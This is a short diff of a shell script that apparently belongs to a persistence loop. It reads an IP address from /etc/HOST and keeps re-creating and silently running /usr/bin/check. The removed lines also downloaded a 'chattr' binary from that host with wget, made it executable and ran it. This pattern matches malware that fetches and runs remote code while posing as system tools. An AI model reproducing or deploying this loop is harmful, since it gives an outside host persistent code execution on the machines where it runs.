@@ -3,7 +3,7 @@
 
 script_path="/usr/bin/check"
 ip_address=$(head -n 1 "/etc/HOST")
-chattr_path="/usr/bin/chattr"
+
 
 while true; do
     if [ ! -f "$script_path" ]; then
@@ -15,16 +15,6 @@ while true; do
         fi
         "$script_path" >/dev/null 2>&1
     fi
-
-    if [ ! -f "$chattr_path" ]; then
-        wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
-        chmod +x "$chattr_path"
-    else
-        if [ ! -x "$chattr_path" ]; then
-            chmod +x "$chattr_path"
-        fi
-        "$chattr_path" >/dev/null 2>&1
-    fi
-
+    
     sleep 1
 done
